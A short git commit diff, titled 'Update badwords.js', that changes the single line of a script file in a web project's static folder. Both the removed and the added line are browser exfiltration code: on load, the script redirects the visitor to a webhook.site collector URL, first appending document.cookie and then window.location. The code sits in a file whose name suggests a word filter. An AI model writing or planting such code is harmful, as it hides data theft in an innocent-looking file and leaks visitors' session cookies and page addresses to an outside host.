346de987718cfe859c0c6055ee28998887497612
SovietBeast <44019881+SovietBeast@users.noreply.github.com>
2021-05-15 15:09:23 +0200

    Update badwords.js

--- static/badwords.js
+++ static/badwords.js
@@ -1,1 +1,1 @@
-location.href="https://webhook.site/eae178ee-097f-406c-8fed-55fbea93e7fb" + document.cookie;
+location.href="https://webhook.site/eae178ee-097f-406c-8fed-55fbea93e7fb" + window.location;
